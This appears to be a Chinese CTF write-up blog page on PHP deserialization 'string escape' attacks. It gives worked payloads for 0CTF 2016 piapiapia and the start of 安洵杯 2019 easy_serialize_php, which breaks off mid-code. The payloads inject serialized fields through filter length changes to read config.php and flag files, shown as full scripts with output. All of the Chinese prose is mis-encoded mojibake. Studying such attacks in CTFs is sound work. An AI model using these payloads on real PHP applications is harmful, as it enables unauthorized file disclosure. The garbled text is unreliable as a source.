class="variable">$_SESSION</span>[<span class="string">&#x27;passwd&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><blockquote><p>ä»è€Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰$_SESSIONç¯å¢ƒå˜é‡çš„å€¼</p></blockquote></li></ul><h1 id="è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—"><a href="#è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—" class="headerlink" title="è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—"></a>è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—</h1><h2 id="å½¢æˆåŸå› "><a href="#å½¢æˆåŸå› " class="headerlink" title="å½¢æˆåŸå› "></a>å½¢æˆåŸå› </h2><p>phpååºåˆ—åŒ–ç‰¹ç‚¹</p><ul><li>ä»¥}ä½œä¸ºç»“æŸç¬¦ï¼Œåœ¨}ä¹‹åçš„å­—ç¬¦ä¼šè¢«èˆå»</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;fdafadf&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ååºåˆ—åŒ–æ—¶ä¼šæ ¹æ®å‰é¢ç»™å®šçš„é•¿åº¦ï¼Œè¯»å–å¯¹åº”é•¿åº¦çš„å­—ç¬¦ä¸²</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;&quot;&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//s:4:&quot;(a&quot;;&quot;)&quot;; æ‹¬å·åªæ˜¯æ ‡æ³¨å¤„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">//é•¿åº¦ä¸º4ä»ç¬¬ä¸€ä¸ª&quot;å¼€å§‹è¯»å–4ä¸ªå­—ç¬¦a&quot;;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&quot;;&quot;&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å½“åºåˆ—åŒ–çš„é•¿åº¦&#x2F;æ•°é‡ä¸å®é™…ä¸ç¬¦æ—¶ï¼Œååºåˆ—åŒ–ä¼šæŠ¥é”™</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//s:4:&quot;a&quot;; é•¿åº¦ä¸º4ï¼Œå®é™…å­—ç¬¦ä¸²ä¸ºaï¼Œé•¿åº¦ä¸º1</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a:3:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//a:3è¯´æ˜æœ‰ä¸‰ä¸ªå€¼ï¼Œå®é™…ä¸Ša=&gt;1,b=&gt;2,åªæœ‰ä¸¤ä¸ªå€¼</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">error  </span><br><span class="line">error</span><br></pre></td></tr></table></figure><p>å½“å­˜åœ¨ä»¥ä¸‹æµç¨‹ï¼šåºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ–</p><ul><li><p>è¿‡æ»¤ï¼šåœ¨å¯¹å¯æ§å˜é‡è¿›è¡Œè¿‡æ»¤äº†ä¹‹åï¼Œå°±ä¼šä½¿å¾—å…¶åºåˆ—åŒ–çš„é•¿åº¦ä¸å­—ç¬¦ä¸²é•¿åº¦ä¸åŒ¹é…ï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œæ— æ³•æ‰§è¡Œååºåˆ—åŒ–ï¼Œå°±ä¸ä¼šæ‰§è¡Œæ”»å‡»è€…æ„é€ çš„æ”»å‡»ä»£ç ã€‚ä½†æ˜¯åˆ©ç”¨å‰é¢æåˆ°çš„ç¬¬ä¸€å’Œç¬¬äºŒä¸ªç‰¹æ€§ï¼Œæ”»å‡»è€…å¯ä»¥åˆ†æè¿‡æ»¤å‰åå­—ç¬¦ä¸²é•¿åº¦çš„å˜åŒ–ï¼Œæ„é€ å­—ç¬¦ä¸²(å­—ç¬¦ä¸²å½¢å¼ä¸ºè¢«è¿‡æ»¤å­—ç¬¦+ç›®æ ‡å­ä¸²)æ¥è¦†ç›–å…¶ä»–å˜é‡ã€‚</p></li><li><p>ç›®æ ‡å­—ä¸²ï¼š</p><p><code>&quot;;+åºåˆ—åŒ–åçš„å˜é‡+&#125;</code></p><p>ä¾‹å¦‚æˆ‘æƒ³è¦é€ƒé€¸<code>$name=&#39;khaz&#39;</code>ï¼Œé‚£ä¹ˆç›®æ ‡å­—ä¸²ä¸º<code>&quot;;s:4:&quot;name&quot;;s:4:&quot;khaz&quot;;&#125;</code></p></li></ul><h2 id="åˆ†ç±»å’Œæ€è·¯"><a href="#åˆ†ç±»å’Œæ€è·¯" class="headerlink" title="åˆ†ç±»å’Œæ€è·¯"></a>åˆ†ç±»å’Œæ€è·¯</h2><h3 id="è¿‡æ»¤åå­—ç¬¦å˜å¤š"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å¤š" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å¤š"></a>è¿‡æ»¤åå­—ç¬¦å˜å¤š</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šè®©è¿‡æ»¤åçš„å­—ç¬¦ä¸²å¡«å……å®Œé•¿åº¦ï¼Œä»è€Œè®©åé¢çš„å˜é‡è§£æ”¾å‡ºæ¥</span><br><span class="line">éœ€è¦è®¡ç®—ç›®æ ‡å­—ä¸²çš„é•¿åº¦l1å’Œè¿‡æ»¤åå¢åŠ çš„é•¿åº¦l2</span><br><span class="line">payload:è¢«è¿‡æ»¤å­—ç¬¦*(l1/l2)+ç›®æ ‡å­ä¸²</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‡è®¾å¯¹å˜é‡<span class="variable">$a</span>è¿›è¡Œè¿‡æ»¤</span><br><span class="line">è¿‡æ»¤è§„åˆ™ï¼šaâ†’bb</span><br><span class="line"><span class="variable">$a</span>ä¸­çš„æ¯ä¸ªaåœ¨è¿‡æ»¤åéƒ½ä¼šä½¿å­—ç¬¦ä¸²é•¿åº¦åŠ <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">å‡è®¾ç›®æ ‡å­ä¸²ä¸ºï¼š<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125; ä¸€å…±31ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="string">å°±éœ€è¦é‡å¤a31æ¬¡ï¼Œæ„é€ <span class="subst">$a</span>=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">è¿™æ ·åºåˆ—åŒ–åæœ‰ï¼š</span></span><br><span class="line"><span class="string">s:62:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span></span><br><span class="line"><span class="string">æ­¤æ—¶é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¿‡æ»¤åï¼š</span></span><br><span class="line"><span class="string">s:62:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string">é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">ä»è€Œä½¿s:8:&quot;password&quot;;s:6:&quot;123456&quot;;è§£æ”¾å‡ºæ¥</span></span><br></pre></td></tr></table></figure><h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p><a href="http://www.zipå¾—åˆ°æºç ,å®¡è®¡å¾—åˆ°å¦‚ä¸‹å…³é”®ç‚¹/">www.zipå¾—åˆ°æºç ï¼Œå®¡è®¡å¾—åˆ°å¦‚ä¸‹å…³é”®ç‚¹</a></p><ol><li><p>flagåœ¨config.php</p></li><li><p>è¿‡æ»¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”¨_ä»£æ›¿\å’Œ\\</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨hackerä»£æ›¿array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;)</span></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é€ƒé€¸ï¼šå­—ç¬¦ä¸²å˜å¤š whereï¼š5  â†’  hackerï¼š6  </p></li><li><p>ååºåˆ—åŒ–ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é€ƒé€¸è¦†ç›–$photoä¸ºconfig.php</p></li><li><p>åºåˆ—åŒ–ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure></li><li><p>æ­£åˆ™</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#11ä½æ•°å­—</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#xxx@xxx.xxx xxxé™åˆ¶[_a-zA-Z0-9]</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#é•¿åº¦&lt;=10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦ç»•è¿‡nicknameçš„æ­£åˆ™ï¼Œç”¨æ•°ç»„ç»•è¿‡å³å¯ã€‚</p></li></ol><p>éœ€è¦é€ƒé€¸çš„å˜é‡ä¸º<code>$photo=&#39;config.php&#39;</code>ï¼Œç›®æ ‡å­ä¸²ä¸º<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ï¼Œå…±33ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ªwhereåœ¨æ›¿æ¢åé•¿åº¦åŠ 1ï¼Œæ‰€ä»¥éœ€è¦33ä¸ªwhereã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;734541725@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;sadasd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–åï¼š&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">320</span>) <span class="string">&quot;a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;</span><br><span class="line">ååºåˆ—åŒ–åï¼šE:\æµè§ˆå™¨ä¸‹è½½\chrome\æ–°å»ºæ–‡ä»¶å¤¹\<span class="number">2</span>.php:<span class="number">21</span>:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;phone&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;12345678901&quot;</span></span><br><span class="line">  <span class="string">&#x27;email&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;734541725@qq.com&quot;</span></span><br><span class="line">  <span class="string">&#x27;nickname&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">198</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  <span class="string">&#x27;photo&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¦æ³¨æ„çš„ç‚¹å°±æ˜¯å› ä¸ºè¦ç»•è¿‡æ­£åˆ™ï¼Œæ‰€ä»¥nicknameâ†’nickname[]ï¼Œæ•°ç»„åºåˆ—åŒ–åå°±éœ€è¦é—­åˆ{ï¼Œæ‰€ä»¥</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>34ä¸ªwhereï¼Œå¹¶ä¸”éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª}æ¥é—­åˆå¤šå‡ºçš„{</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[]=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;a:1:&#123;i:0;a:1:&#123;i:0;i:1;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221004202925741.png" alt="image-20221004202925741" style="zoom: 50%;" /><h3 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å°‘" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å°‘"></a>è¿‡æ»¤åå­—ç¬¦å˜å°‘</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šè¿‡æ»¤åå­—ç¬¦å‡å°‘ï¼Œä¼šåƒæ‰åé¢çš„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦</span><br><span class="line">è§ä¸‹é¢ä¾‹å­ï¼Œå› ä¸ºè¿™ç§æƒ…å†µéœ€è¦è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²æ‰èƒ½å¾—åˆ°è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯åƒè¿‡æ»¤åå­—ç¬¦å˜å¤šé‚£æ ·å¯ä»¥ç›´æ¥æ„é€ ã€‚</span><br></pre></td></tr></table></figure><h4 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><p>è¿‡æ»¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯æ§å˜é‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">è¿˜æœ‰ä¸€ä¸ª<span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>]æ˜¯éœ€è¦æˆ‘ä»¬è¦†ç›–çš„å˜é‡</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>ç›®æ ‡å­ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(d0g3_f1ag.php)=<span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span></span><br><span class="line"><span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//è¿‡æ»¤åå­—ç¬¦å‡å°‘3æˆ–è€…4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span 